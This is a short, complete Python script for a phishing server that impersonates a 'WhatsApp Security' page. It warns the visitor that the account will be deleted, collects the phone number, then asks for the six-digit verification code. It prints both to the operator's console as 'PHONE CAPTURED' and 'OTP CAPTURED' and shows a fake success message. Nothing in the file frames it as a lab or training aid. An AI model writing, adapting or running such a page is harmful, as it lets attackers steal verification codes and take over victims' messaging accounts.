from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import os

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        if self.path == '/':
            html = """
            <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
            <body style="font-family: Arial; text-align: center; padding-top: 50px; background: #f0f2f5;">
            <div style="background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px;">
            <h2 style="color: #25D366;">WhatsApp Security</h2>
            <p style="color: red; font-size: 14px;">Your account will be deleted. Verify your number to secure it.</p>
            <form action='/capture' method='POST'>
            <input type="text" name="phone" placeholder="Phone Number" required style="width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box;">
            <button type="submit" style="width: 100%; padding: 12px; background: #25D366; color: white; border: none; border-radius: 5px; font-size: 16px;">Next</button>
            </form></div></body></html>
            """
            self.wfile.write(html.encode())
        elif self.path == '/otp':
            html = """
            <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
            <body style="font-family: Arial; text-align: center; padding-top: 50px; background: #f0f2f5;">
            <div style="background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px;">
            <h2 style="color: #25D366;">Enter OTP</h2>
            <p>Enter the 6-digit code sent to your phone.</p>
            <form action='/success' method='POST'>
            <input type="text" name="otp" placeholder="123456" maxlength="6" required style="width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; text-align: center; letter-spacing: 5px;">
            <button type="submit" style="width: 100%; padding: 12px; background: #25D366; color: white; border: none; border-radius: 5px; font-size: 16px;">Verify</button>
            </form></div></body></html>
            """
            self.wfile.write(html.encode())
        elif self.path == '/success':
            self.wfile.write(b"<h1 style='text-align:center;margin-top:50px;'>Verified Successfully!</h1>")
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = urllib.parse.parse_qs(self.rfile.read(length).decode('utf-8'))
        if self.path == '/capture':
            print(f"\n[!!!] PHONE CAPTURED: {data.get('phone',[''])[0]}")
            self.send_response(302)
            self.send_header('Location', '/otp')
            self.end_headers()
        elif self.path == '/success':
            print(f"[!!!] OTP CAPTURED: {data.get('otp',[''])[0]}\n")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<h1 style='text-align:center;margin-top:50px;'>Verified Successfully!</h1>")

port = int(os.environ.get("PORT", 8080))
print(f"[*] Server running on port {port}...")
HTTPServer(('0.0.0.0', port), H).serve_forever()